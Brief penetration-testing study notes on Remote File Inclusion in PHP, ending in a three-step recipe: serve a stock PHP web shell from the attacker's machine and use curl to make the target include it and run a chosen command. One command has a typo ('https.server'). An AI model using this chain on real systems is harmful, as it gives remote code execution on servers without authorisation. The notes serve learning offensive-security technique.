
RFI is less common than LFI - the system must be configured in a specific way - e.g. PHP web apps must have `allow_url_include` enabled.

This vulnerability will allow us to include files from remote systems over HTTP or SMB. The file is also executed in the context of the web application.

Scenarios where we'll find the vulnerability is when the web application loads files or contents from remote systems - e.g. libraries or application data.

RFI can be discovered using the same techniques from LFI and Directory Traversal.


1. make use of a php web shell in `/usr/share/webshells/php/simple-backdoor.php`
2. `python -m https.server 80` - make the file available to the remote target
3. `curl http://url/directory/index.php?page=http://local-ip:port/simple-backdoor.php&cmd=CMD` - request the file from our local server and pass it a command to execute